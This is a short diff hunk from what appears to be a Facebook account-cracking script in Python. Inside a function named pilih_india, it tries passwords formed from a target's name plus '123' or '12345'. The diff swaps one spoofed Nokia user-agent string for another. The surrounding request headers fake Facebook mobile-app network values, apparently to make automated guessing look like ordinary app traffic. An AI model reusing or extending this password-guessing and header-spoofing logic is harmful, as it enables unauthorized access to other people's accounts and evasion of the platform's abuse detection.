@@ -525,7 +525,7 @@ def pilih_india():
 			pass
 		try:
 			for pw in [name.lower()+'123',name.lower()+'12345']:
-				ua = random.choice(["Nokia6610/1.0 (3.09) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible;YahooSeeker/M1A1-R2D2; http://help.yahoo.com/help/us/ysearch/crawling/crawling-01.html)"])
+				ua = random.choice(["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/011.012; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba"])
 				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
 				'x-fb-net-hni': str(random.randint(20000, 40000)), 
 				'x-fb-connection-quality': 'EXCELLENT', 
